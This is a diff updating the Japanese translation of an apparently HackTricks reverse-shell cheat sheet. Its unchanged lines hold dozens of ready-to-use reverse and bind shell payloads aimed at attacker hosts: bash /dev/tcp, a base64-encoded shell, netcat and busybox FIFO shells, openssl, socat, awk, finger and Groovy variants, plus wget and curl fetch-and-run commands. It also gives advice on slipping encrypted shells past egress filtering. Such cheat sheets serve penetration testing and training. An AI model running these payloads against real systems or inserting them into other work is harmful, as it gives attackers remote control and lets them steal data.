@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**これらのシェルについて質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com)** で確認できます**
+**これらの shell について質問がある場合は、**[**https://explainshell.com/**](https://explainshell.com)** で確認できます。**
 
 ## Full TTY
 
-**一度 reverse shell を取得したら**[ **full TTY を得るためにこのページを読んでください**](full-ttys.md)**。**
+**reverse shell を取得したら、**[ **このページを読んで full TTY を取得してください**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-他の shells も確認するのを忘れないでください: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
+他の shell も忘れずに確認してください: sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、bash。
 
 ### Symbol safe shell
 ```bash
@@ -32,26 +32,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Shell explanation
+#### Shellの説明
 
-1. **`bash -i`**: このコマンドのこの部分は、対話的な (`-i`) Bash shell を起動します。
-2. **`>&`**: このコマンドのこの部分は、**標準出力** (`stdout`) と **標準エラー** (`stderr`) の両方を**同じ宛先へリダイレクトする**ための省略記法です。
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、**指定された IP アドレスと port への TCP connection を表す**特別な file です。
-- **出力と error stream をこの file にリダイレクトすることで**、このコマンドは interactive shell session の出力を attacker の machine に送ります。
-4. **`0>&1`**: このコマンドのこの部分は、**標準入力** (`stdin`) を**標準出力** (`stdout`) と同じ宛先へリダイレクトします。
+1. **`bash -i`**: このコマンド部分は、interactive（`-i`）Bash shellを開始します。
+2. **`>&`**: このコマンド部分は、**standard output**（`stdout`）と**standard error**（`stderr`）の両方を**同じ宛先にリダイレクト**する短縮記法です。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、**指定されたIP addressとportへのTCP connectionを表す**特殊なファイルです。
+- **outputとerrorのstreamをこのファイルにリダイレクト**することで、このコマンドはinteractive shell sessionのoutputを攻撃者のmachineに効果的に送信します。
+4. **`0>&1`**: このコマンド部分は、**standard input（`stdin`）をstandard output（`stdout`）と同じ宛先にリダイレクト**します。
 
-### Create in file and execute
+### ファイルに作成して実行
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Linuxベースのweb application内で **Remote Code Execution (RCE)** 脆弱性を扱う場合、reverse shell の取得は iptables ルールや複雑な packet filtering 機構などの network defenses によって妨げられることがあります。このような制約された環境では、代替手段として PTY (Pseudo Terminal) shell を確立し、侵害した system とより効果的にやり取りする方法があります。
+Linux-based web application 内の **Remote Code Execution (RCE)** vulnerability を扱う際、iptables ルールや複雑な packet filtering mechanisms などの network defenses によって reverse shell の確立が妨げられる場合があります。このような制約された環境では、代替手段として PTY (Pseudo Terminal) shell を確立し、compromised system とより効果的に対話する方法があります。
 
-この目的に推奨される tool は [toboggan](https://github.com/n3rada/toboggan.git) で、target environment とのやり取りを簡素化します。
+この目的には、target environment との interaction を簡略化する [toboggan](https://github.com/n3rada/toboggan.git) が推奨されます。
 
-toboggan を効果的に使うには、target system の RCE context に合わせた Python module を作成します。たとえば、`nix.py` という module は次のように構成できます:
+toboggan を効果的に使用するには、target system の RCE context に合わせた Python module を作成します。たとえば、`nix.py` という module は次のように構成できます。
 ```python3
 import jwt
 import httpx
@@ -75,21 +75,21 @@ response.raise_for_status()
 
 return response.text
 ```
-そして、次のように実行できます:
+そして、次を実行できます:
 ```shell
 toboggan -m nix.py -i
 ```
-インタラクティブシェルを直接利用するには、`-b` を追加して Burpsuite 統合を有効にし、`-i` を削除してより基本的な rce wrapper にできます。
+直接 `interactive shell` を活用するには、Burpsuite integration 用に `-b` を追加し、より basic な `rce wrapper` にする場合は `-i` を削除します。
 
-別の方法として、`IppSec` の forward shell 実装 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) を使うこともできます。
+別の方法として、`IppSec` の forward shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) を使用することもできます。
 
-変更する必要があるのは次の点だけです。
+次の項目を変更するだけです。
 
-- 脆弱なホストの URL
-- payload の prefix と suffix（必要な場合）
-- payload の送信方法（headers? data? extra info?）
+- 脆弱な host の URL
+- payload の prefix と suffix（存在する場合）
+- payload の送信方法（headers？data？追加情報？）
 
-その後は、**コマンドを送る**だけでよく、あるいは **`upgrade` コマンドを使って** フル PTY を取得できます（なお、pipes の読み書きには約 1.3 秒の遅延があります）。
+その後、**send commands** を実行するか、**`upgrade` command** を使用して full PTY を取得できます（pipes は約 1.3 秒の遅延で読み書きされる点に注意してください）。
 
 ## Netcat
 ```bash
@@ -101,19 +101,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-**routers**、**embedded devices**、**containers**、および簡素化された Linux appliances で非常によく使われます。スタンドアロンの `nc` がない場合は、BusyBox がそれを提供しているか確認してください:
+**routers**、**embedded devices**、**containers**、および stripped-down Linux appliances で非常によく使われています。standalone の `nc` がない場合は、BusyBox がそれを提供しているか確認してください:<sup>[[8]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-もし `busybox nc` が存在するものの、対話型実行が不安定な場合は、`nc` セクションの FIFO パターンは通常そのまま使えます:
+`busybox nc` が存在するものの、interactive execution が不安定な場合は、通常、`nc` セクションの FIFO パターンが引き続き機能します:
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) で確認してください
+[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)で確認してください。
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -130,7 +130,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-コマンドを送信するには、それを書き込んで Enter を押し、CTRL+D を押します（STDIN を停止するため）
+コマンドを送信するには、コマンドを入力してEnterを押し、CTRL+Dを押します（STDINを停止するため）<sup>[[3]](#references)</sup>
 
 **被害者**
 ```bash
@@ -231,14 +231,14 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-## Zsh (built-in TCP)
+## Zsh (内蔵 TCP)
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
 zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rustで書かれたモダンなnetcat風listener（2024年以降、Kaliにパッケージ化済み）。
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rustで記述された現代的なnetcat風のlistener（2024年以降Kaliにパッケージされています）。<sup>[[5]](#references)</sup>
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -249,13 +249,13 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 Features:
-- Optional `--ssl` flag for encrypted transport (TLS 1.3)
-- `-s` to spawn any binary (e.g. `/bin/sh`, `python3`) on the victim
-- `--up` to automatically upgrade to a fully interactive PTY
+- 暗号化された transport (TLS 1.3) 用のオプションの `--ssl` flag
+- 被害者上で任意の binary (例: `/bin/sh`、`python3`) を spawn する `-s`
+- 完全にインタラクティブな PTY へ自動的に upgrade する `--up`
 
 ## pwncat-cs
 
-If you already have **any raw reverse shell** but want a listener that automatically tries to upgrade it into a more usable session, `pwncat-cs` is a good modern replacement for a plain `nc -lvnp` listener.
+すでに **raw reverse shell** を取得していて、それをより使いやすい session へ自動的に upgrade しようとする listener が必要な場合、`pwncat-cs` は単純な `nc -lvnp` listener に代わる、優れた modern replacement です。<sup>[[7]](#references)</sup>
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
 python3 -m pip install --user pwncat-cs
@@ -264,11 +264,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-**暗号化**された `ssl-bind` と `ssl-connect` チャンネルもサポートしているので、転送暗号化が必要なときは `ncat --ssl` や `socat OPENSSL:` のペイロードと組み合わせられます。
+It also supports **encrypted** `ssl-bind` and `ssl-connect` channels, so you can pair it with `ncat --ssl` or `socat OPENSSL:` payloads when you need transport encryption.<sup>[[7]](#references)</sup>
 
 ## revsh (encrypted & pivot-ready)
 
-`revsh` は小さな C の client/server で、**暗号化された Diffie-Hellman tunnel** 上に full TTY を提供し、必要に応じて **TUN/TAP** interface を接続して reverse VPN-like pivoting もできます。
+`revsh` は、**encrypted Diffie-Hellman tunnel** 経由で完全な TTY を提供する小型の C client/server で、reverse VPN-like pivoting のために **TUN/TAP** interface を任意で接続できます。<sup>[[6]](#references)</sup>
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -279,16 +279,16 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 # Victim – reverse shell over TLS to the attacker
 ./revsh <ATTACKER-IP>:443
 ```
-便利なフラグ:
+Useful flags:
 - `-b` : reverse の代わりに bind-shell
 - `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS 経由で proxy
-- `-t` : TUN interface を作成する (reverse VPN)
+- `-t` : TUN interface を作成（reverse VPN）
 
-セッション全体が暗号化され multiplex されるため、plain-text の `/dev/tcp` shell を止めてしまう単純な egress filtering をよく bypass できます。
+セッション全体が暗号化および multiplex されるため、プレーンテキストの `/dev/tcp` shell なら遮断されるような単純な egress filtering も、しばしば bypass できます。
 
 ## OpenSSL
 
-**単一ポートの暗号化された reverse shell** は、通常の 2-listener パターンより実用的です。`443` 経由で proxy しやすく、自動化も簡単だからです。
+**single-port encrypted reverse shell** は、通常、classic な two-listener pattern より実用的です。`443` 経由で proxy しやすく、自動化もより簡単だからです。
 
 The Attacker (Kali)
 ```bash
@@ -303,7 +303,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-入力/出力チャネルを分離したい場合は、従来の**2-listener**パターンもまだ使えます:
+入出力チャネルを分離したい場合は、従来の **two-listener** パターンも使用できます。
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -320,7 +320,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### リバースシェル
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -335,9 +335,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-コマンドを送信するには、書き込んで Enter を押し、CTRL+D を押します（STDIN を停止するため）
+コマンドを送信するには、入力してEnterを押し、CTRL+Dを押します（STDINを停止するため）<sup>[[3]](#references)</sup>
 
-**Victim**
+**被害者**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -368,11 +368,11 @@ close(Service)
 ```
 ## Xterm
 
-これはポート 6001 であなたのシステムへの接続を試みます:
+これは port 6001 であなたのシステムに接続しようとします：
 ```bash
 xterm -display 10.0.0.1:1
 ```
-reverse shell を受け取るには、次を使用できます（ポート 6001 で待ち受けます）：
+reverse shellを受信するには、次のコマンドを使用できます（port 6001でlistenします）。
 ```bash
 # Authorize host
 xhost +targetip
@@ -381,22 +381,22 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注: Java reverse shell も Groovy で動作します
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## References
+## 参考資料
 
-- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
-- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
-- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
-- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
-- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
+- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [3] [Using Whois and Finger for Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - The modern port listener and reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - A reverse shell with terminal support, data tunneling, and advanced pivoting capabilities](https://github.com/emptymonkey/revsh)
+- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
+- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
